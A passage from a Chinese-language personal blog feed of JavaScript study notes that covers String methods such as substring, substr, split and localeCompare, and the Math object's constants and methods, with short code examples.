<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(<span class="number">10</span>, <span class="number">4</span>) <span class="comment">// &quot;Script&quot;</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(<span class="number">4</span>, <span class="number">10</span>) <span class="comment">// &quot;Script&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，调换<code>substring</code>方法的两个参数，都得到同样的结果。</p>
<p>如果参数是负数，<code>substring</code>方法会自动将负数转为<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(-<span class="number">3</span>) <span class="comment">// &quot;JavaScript&quot;</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(<span class="number">4</span>, -<span class="number">3</span>) <span class="comment">// &quot;Java&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第二个例子的参数<code>-3</code>会自动变成<code>0</code>，等同于<code>&#39;JavaScript&#39;.substring(4, 0)</code>。由于第二个参数小于第一个参数，会自动互换位置，所以返回<code>Java</code>。<br>由于这些规则违反直觉，因此不建议使用<code>substring</code>方法，应该优先使用<code>slice</code>。</p>
<h5 id="7-4-6-String-prototype-substr"><a href="#7-4-6-String-prototype-substr" class="headerlink" title="7.4.6 String.prototype.substr()"></a>7.4.6 String.prototype.substr()</h5><p><code>substr</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>和<code>substring</code>方法的作用相同。<br><code>substr</code>方法的第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substr(<span class="number">4</span>, <span class="number">6</span>) <span class="comment">// &quot;Script&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substr(<span class="number">4</span>) <span class="comment">// &quot;Script&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substr(-<span class="number">6</span>) <span class="comment">// &quot;Script&quot;</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substr(<span class="number">4</span>, -<span class="number">1</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第二个例子的参数<code>-1</code>自动转为<code>0</code>，表示子字符串长度为<code>0</code>，所以返回空字符串。</p>
<h5 id="7-4-7-String-prototype-indexOf-，String-prototype-lastIndexOf"><a href="#7-4-7-String-prototype-indexOf-，String-prototype-lastIndexOf" class="headerlink" title="7.4.7 String.prototype.indexOf()，String.prototype.lastIndexOf()"></a>7.4.7 String.prototype.indexOf()，String.prototype.lastIndexOf()</h5><p><code>indexOf</code>方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回<code>-1</code>，就表示不匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.indexOf(<span class="string">&#x27;o&#x27;</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.indexOf(<span class="string">&#x27;script&#x27;</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p><code>indexOf</code>方法还可以接受第二个参数，表示从该位置开始向后匹配</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.indexOf(<span class="string">&#x27;o&#x27;</span>, <span class="number">6</span>) <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<p><code>lastIndexOf</code>方法的用法跟<code>indexOf</code>方法一致，主要的区别是<code>lastIndexOf</code>从尾部开始匹配，<code>indexOf</code>则是从头部开始匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.lastIndexOf(<span class="string">&#x27;o&#x27;</span>) <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<p>另外，<code>lastIndexOf</code>的第二个参数表示从该位置起向前匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.lastIndexOf(<span class="string">&#x27;o&#x27;</span>, <span class="number">6</span>) <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>

<h5 id="7-4-8-String-prototype-trim"><a href="#7-4-8-String-prototype-trim" class="headerlink" title="7.4.8 String.prototype.trim()"></a>7.4.8 String.prototype.trim()</h5><p><code>trim</code>方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;  hello world  &#x27;</span>.trim()</span><br><span class="line"><span class="comment">// &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>
<p>该方法去除的不仅是空格，还包括制表符（<code>\t</code>、<code>\v</code>）、换行符（<code>\n</code>）和回车符（<code>\r</code>）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\r\nabc \t&#x27;</span>.trim() <span class="comment">// &#x27;abc&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="7-4-9-String-prototype-toLowerCase-，String-prototype-toUpperCase"><a href="#7-4-9-String-prototype-toLowerCase-，String-prototype-toUpperCase" class="headerlink" title="7.4.9 String.prototype.toLowerCase()，String.prototype.toUpperCase()"></a>7.4.9 String.prototype.toLowerCase()，String.prototype.toUpperCase()</h5><p><code>toLowerCase</code>方法用于将一个字符串全部转为小写，<code>toUpperCase</code>则是全部转为大写。它们都返回一个新字符串，不改变原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;Hello World&#x27;</span>.toLowerCase()</span><br><span class="line"><span class="comment">// &quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;Hello World&#x27;</span>.toUpperCase()</span><br><span class="line"><span class="comment">// &quot;HELLO WORLD&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="7-4-10-String-prototype-match"><a href="#7-4-10-String-prototype-match" class="headerlink" title="7.4.10 String.prototype.match()"></a>7.4.10 String.prototype.match()</h5><p><code>match</code>方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;cat, bat, sat, fat&#x27;</span>.match(<span class="string">&#x27;at&#x27;</span>) <span class="comment">// [&quot;at&quot;]</span></span><br><span class="line"><span class="string">&#x27;cat, bat, sat, fat&#x27;</span>.match(<span class="string">&#x27;xt&#x27;</span>) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>返回的数组还有<code>index</code>属性和<code>input</code>属性，分别表示匹配字符串开始的位置和原始字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> matches = <span class="string">&#x27;cat, bat, sat, fat&#x27;</span>.match(<span class="string">&#x27;at&#x27;</span>);</span><br><span class="line">matches.index <span class="comment">// 1</span></span><br><span class="line">matches.input <span class="comment">// &quot;cat, bat, sat, fat&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>match</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一章</p>
<h5 id="7-4-11-String-prototype-search-，String-prototype-replace"><a href="#7-4-11-String-prototype-search-，String-prototype-replace" class="headerlink" title="7.4.11 String.prototype.search()，String.prototype.replace()"></a>7.4.11 String.prototype.search()，String.prototype.replace()</h5><p><code>search</code>方法的用法基本等同于<code>match</code>，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回<code>-1</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;cat, bat, sat, fat&#x27;</span>.search(<span class="string">&#x27;at&#x27;</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p><code>search</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。<br><code>replace</code>方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有<code>g</code>修饰符的正则表达式）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aaa&#x27;</span>.replace(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">// &quot;baa&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>replace</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>
<h5 id="7-4-12-String-prototype-split"><a href="#7-4-12-String-prototype-split" class="headerlink" title="7.4.12 String.prototype.split()"></a>7.4.12 String.prototype.split()</h5><p><code>split</code>方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;&#x27;</span>) <span class="comment">// [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果省略参数，则返回数组的唯一成员就是原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split() <span class="comment">// [&quot;a|b|c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a||c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// [&#x27;a&#x27;, &#x27;&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>如果满足分割规则的部分处于字符串的开头或结尾（即它的前面或后面没有其他字符），则返回数组的第一个或最后一个成员是一个空字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// [&quot;&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;&quot;]</span></span><br></pre></td></tr></table></figure>
<p><code>split</code>方法还可以接受第二个参数，限定返回数组的最大成员数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>, <span class="number">0</span>) <span class="comment">// []</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>, <span class="number">1</span>) <span class="comment">// [&quot;a&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>, <span class="number">2</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>, <span class="number">3</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>, <span class="number">4</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>split</code>方法的第二个参数，决定了返回数组的成员数。<br><code>split</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>
<h5 id="7-4-13-String-prototype-localeCompare"><a href="#7-4-13-String-prototype-localeCompare" class="headerlink" title="7.4.13 String.prototype.localeCompare()"></a>7.4.13 String.prototype.localeCompare()</h5><p><code>localeCompare</code>方法用于比较两个字符串。它返回一个整数，如果小于<code>0</code>，表示第一个字符串小于第二个字符串；如果等于<code>0</code>，表示两者相等；如果大于<code>0</code>，表示第一个字符串大于第二个字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;apple&#x27;</span>.localeCompare(<span class="string">&#x27;banana&#x27;</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="string">&#x27;apple&#x27;</span>.localeCompare(<span class="string">&#x27;apple&#x27;</span>) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>该方法的最大特点，就是会考虑自然语言的顺序。举例来说，正常情况下，大写的英文字母小于小写字母。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;B&#x27;</span> &gt; <span class="string">&#x27;a&#x27;</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字母<code>B</code>小于字母<code>a</code>。因为 JavaScript 采用的是 Unicode 码点比较，<code>B</code>的码点是66，而<code>a</code>的码点是97。<br>但是，<code>localeCompare</code>方法会考虑自然语言的排序情况，将<code>B</code>排在<code>a</code>的前面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;B&#x27;</span>.localeCompare(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>localeCompare</code>方法返回整数<code>1</code>，表示<code>B</code>较大。<br><code>localeCompare</code>还可以有第二个参数，指定所使用的语言（默认是英语），然后根据该语言的规则进行比较。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;ä&#x27;</span>.localeCompare(<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;de&#x27;</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="string">&#x27;ä&#x27;</span>.localeCompare(<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;sv&#x27;</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>de</code>表示德语，<code>sv</code>表示瑞典语。德语中，<code>ä</code>小于<code>z</code>，所以返回<code>-1</code>；瑞典语中，<code>ä</code>大于<code>z</code>，所以返回<code>1</code>。</p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-String对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0022</title>
    <url>/2021/05/15/%E6%89%93%E5%8D%A10022/</url>
    <content><![CDATA[<p><font color=d71345>把你手给我哈哈哈哈哈</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="8-Math对象"><a href="#8-Math对象" class="headerlink" title="8. Math对象"></a>8. Math对象</h3><h4 id="8-1-静态属性"><a href="#8-1-静态属性" class="headerlink" title="8.1 静态属性"></a>8.1 静态属性</h4><p><code>Math</code>对象的静态属性，提供以下一些数学常数。</p>
<ul>
<li><code>Math.E</code>：常数<code>e</code>。</li>
<li><code>Math.LN2</code>：2 的自然对数。</li>
<li><code>Math.LN10</code>：10 的自然对数。</li>
<li><code>Math.LOG2E</code>：以 2 为底的<code>e</code>的对数。</li>
<li><code>Math.LOG10E</code>：以 10 为底的<code>e</code>的对数。</li>
<li><code>Math.PI</code>：常数<code>π</code>。</li>
<li><code>Math.SQRT1_2</code>：0.5 的平方根。</li>
<li><code>Math.SQRT2</code>：2 的平方根。<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.E <span class="comment">// 2.718281828459045</span></span><br><span class="line"><span class="built_in">Math</span>.LN2 <span class="comment">// 0.6931471805599453</span></span><br><span class="line"><span class="built_in">Math</span>.LN10 <span class="comment">// 2.302585092994046</span></span><br><span class="line"><span class="built_in">Math</span>.LOG2E <span class="comment">// 1.4426950408889634</span></span><br><span class="line"><span class="built_in">Math</span>.LOG10E <span class="comment">// 0.4342944819032518</span></span><br><span class="line"><span class="built_in">Math</span>.PI <span class="comment">// 3.141592653589793</span></span><br><span class="line"><span class="built_in">Math</span>.SQRT1_2 <span class="comment">// 0.7071067811865476</span></span><br><span class="line"><span class="built_in">Math</span>.SQRT2 <span class="comment">// 1.4142135623730951</span></span><br></pre></td></tr></table></figure>
这些属性都是只读的，不能修改。</li>
</ul>
<h4 id="8-2-静态方法"><a href="#8-2-静态方法" class="headerlink" title="8.2 静态方法"></a>8.2 静态方法</h4><p><code>Math</code>对象提供以下一些静态方法。</p>
<ul>
<li><code>Math.abs()</code>：绝对值</li>
<li><code>Math.ceil()</code>：向上取整</li>
<li><code>Math.floor()</code>：向下取整</li>
<li><code>Math.max()</code>：最大值</li>
<li><code>Math.min()</code>：最小值</li>
<li><code>Math.pow()</code>：幂运算</li>
<li><code>Math.sqrt()</code>：平方根</li>
<li><code>Math.log()</code>：自然对数</li>
<li><code>Math.exp()</code>：e的指数</li>
<li><code>Math.round()</code>：四舍五入</li>
<li><code>Math.random()</code>：随机数</li>
</ul>
<h5 id="8-2-1-Math-abs"><a href="#8-2-1-Math-abs" class="headerlink" title="8.2.1 Math.abs()"></a>8.2.1 Math.abs()</h5><p><code>Math.abs</code>方法返回参数值的绝对值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.abs(<span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.abs(-<span class="number">1</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-2-Math-max-，Math-min"><a href="#8-2-2-Math-max-，Math-min" class="headerlink" title="8.2.2 Math.max()，Math.min()"></a>8.2.2 Math.max()，Math.min()</h5><p><code>Math.max</code>方法返回参数之中最大的那个值，<code>Math.min</code>返回最小的那个值。如果参数为空, <code>Math.min</code>返回<code>Infinity</code>,<code> Math.max</code>返回<code>-Infinity</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max(<span class="number">2</span>, -<span class="number">1</span>, <span class="number">5</span>) <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">Math</span>.min(<span class="number">2</span>, -<span class="number">1</span>, <span class="number">5</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">Math</span>.min() <span class="comment">// Infinity</span></span><br><span class="line"><span class="built_in">Math</span>.max() <span class="comment">// -Infinity</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-3-Math-floor-，Math-ceil"><a href="#8-2-3-Math-floor-，Math-ceil" class="headerlink" title="8.2.3 Math.floor()，Math.ceil()"></a>8.2.3 Math.floor()，Math.ceil()</h5><p><code>Math.floor</code>方法返回小于或等于参数值的最大整数（地板值）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.floor(<span class="number">3.2</span>) <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">Math</span>.floor(-<span class="number">3.2</span>) <span class="comment">// -4</span></span><br></pre></td></tr></table></figure>
<p><code>Math.ceil</code>方法返回大于或等于参数值的最小整数（天花板值）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.ceil(<span class="number">3.2</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="built_in">Math</span>.ceil(-<span class="number">3.2</span>) <span class="comment">// -3</span></span><br></pre></td></tr></table></figure>
<p>这两个方法可以结合起来，实现一个总是返回数值的整数部分的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ToInteger</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  x = <span class="built_in">Number</span>(x);</span><br><span class="line">  <span class="keyword">return</span> x &lt; <span class="number">0</span> ? <span class="built_in">Math</span>.ceil(x) : <span class="built_in">Math</span>.floor(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ToInteger(<span class="number">3.2</span>) <span class="comment">// 3</span></span><br><span class="line">ToInteger(<span class="number">3.5</span>) <span class="comment">// 3</span></span><br><span class="line">ToInteger(<span class="number">3.8</span>) <span class="comment">// 3</span></span><br><span class="line">ToInteger(-<span class="number">3.2</span>) <span class="comment">// -3</span></span><br><span class="line">ToInteger(-<span class="number">3.5</span>) <span class="comment">// -3</span></span><br><span class="line">ToInteger(-<span class="number">3.8</span>) <span class="comment">// -3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，不管正数或负数，<code>ToInteger</code>函数总是返回一个数值的整数部分</p>
<h5 id="8-2-4-Math-round"><a href="#8-2-4-Math-round" class="headerlink" title="8.2.4 Math.round()"></a>8.2.4 Math.round()</h5><p><code>Math.round</code>方法用于四舍五入。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.round(<span class="number">0.1</span>) <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.round(<span class="number">0.5</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.round(<span class="number">0.6</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">Math</span>.floor(x + <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>注意，它对负数的处理（主要是对<code>0.5</code>的处理）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.round(-<span class="number">1.1</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">Math</span>.round(-<span class="number">1.5</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">Math</span>.round(-<span class="number">1.6</span>) <span class="comment">// -2</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-5-Math-pow"><a href="#8-2-5-Math-pow" class="headerlink" title="8.2.5 Math.pow()"></a>8.2.5 Math.pow()</h5><p><code>Math.pow</code>方法返回以第一个参数为底数、第二个参数为指数的幂运算值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等同于 2 ** 2</span></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">2</span>) <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 等同于 2 ** 3</span></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<p>下面是计算圆面积的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> radius = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> area = <span class="built_in">Math</span>.PI * <span class="built_in">Math</span>.pow(radius, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<h5 id="8-2-6-Math-sqrt"><a href="#8-2-6-Math-sqrt" class="headerlink" title="8.2.6 Math.sqrt()"></a>8.2.6 Math.sqrt()</h5><p><code>Math.sqrt</code>方法返回参数值的平方根。如果参数是一个负值，则返回<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sqrt(<span class="number">4</span>) <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">Math</span>.sqrt(-<span class="number">4</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-7-Math-log"><a href="#8-2-7-Math-log" class="headerlink" title="8.2.7 Math.log()"></a>8.2.7 Math.log()</h5><p><code>Math.log</code>方法返回以<code>e</code>为底的自然对数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log(<span class="built_in">Math</span>.E) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.log(<span class="number">10</span>) <span class="comment">// 2.302585092994046</span></span><br></pre></td></tr></table></figure>
<p>如果要计算以<code>10</code>为底的对数，可以先用<code>Math.log</code>求出自然对数，然后除以<code>Math.LN10</code>；求以<code>2</code>为底的对数，可以除以<code>Math.LN2</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.log(<span class="number">100</span>)/<span class="built_in">Math</span>.LN10 <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">Math</span>.log(<span class="number">8</span>)/<span class="built_in">Math</span>.LN2 <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-8-Math-exp"><a href="#8-2-8-Math-exp" class="headerlink" title="8.2.8 Math.exp()"></a>8.2.8 Math.exp()</h5><p><code>Math.exp</code>方法返回常数<code>e</code>的参数次方。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.exp(<span class="number">1</span>) <span class="comment">// 2.718281828459045</span></span><br><span class="line"><span class="built_in">Math</span>.exp(<span class="number">3</span>) <span class="comment">// 20.085536923187668</span></span><br></pre></td></tr></table></figure>
<h5 id="8-2-9-Math-random"><a href="#8-2-9-Math-random" class="headerlink" title="8.2.9 Math.random()"></a>8.2.9 Math.random()</h5><p><code>Math.random()</code>返回<code>0</code>到<code>1</code>之间的一个伪随机数，可能等于<code>0</code>，但是一定小于<code>1</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.random() <span class="comment">// 0.7151307314634323</span></span><br></pre></td></tr></table></figure>
<p>任意范围的随机数生成函数如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomArbitrary</span>(<span class="params">min, max</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random() * (max - min) + min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getRandomArbitrary(<span class="number">1.5</span>, <span class="number">6.5</span>)</span><br><span class="line"><span class="comment">// 2.4942810038223864</span></span><br><span class="line">=====================</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomInt</span>(<span class="params">min, max</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getRandomInt(<span class="number">1</span>, <span class="number">6</span>) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>返回随机字符的例子如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params">length</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ALPHABET = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">  ALPHABET += <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">  ALPHABET += <span class="string">&#x27;0123456789-_&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">    <span class="keyword">var</span> rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * ALPHABET.length);</span><br><span class="line">    str += ALPHABET.substring(rand, rand + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">random_str(<span class="number">6</span>) <span class="comment">// &quot;NdQKOr&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>random_str</code>函数接受一个整数作为参数，返回变量<code>ALPHABET</code>内的随机字符所组成的指定长度的字符串</p>
<h5 id="8-2-10-三角函数方法"><a href="#8-2-10-三角函数方法" class="headerlink" title="8.2.10 三角函数方法"></a>8.2.10 三角函数方法</h5><p><code>Math</code>对象还提供一系列三角函数方法。</p>
<ul>
<li><code>Math.sin()</code>：返回参数的正弦（参数为弧度值）</li>
<li><code>Math.cos()</code>：返回参数的余弦（参数为弧度值）</li>
<li><code>Math.tan()</code>：返回参数的正切（参数为弧度值）</li>
<li><code>Math.asin()</code>：返回参数的反正弦（返回值为弧度值）</li>
<li><code>Math.acos()</code>：返回参数的反余弦（返回值为弧度值）</li>
<li><code>Math.atan()</code>：返回参数的反正切（返回值为弧度值）</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sin(<span class="number">0</span>) <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.cos(<span class="number">0</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">Math</span>.tan(<span class="number">0</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sin(<span class="built_in">Math</span>.PI / <span class="number">2</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.asin(<span class="number">1</span>) <span class="comment">// 1.5707963267948966</span></span><br><span class="line"><span class="built_in">Math</span>.acos(<span class="number">1</span>) <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Math</span>.atan(<span class="number">1</span>) <span class="comment">// 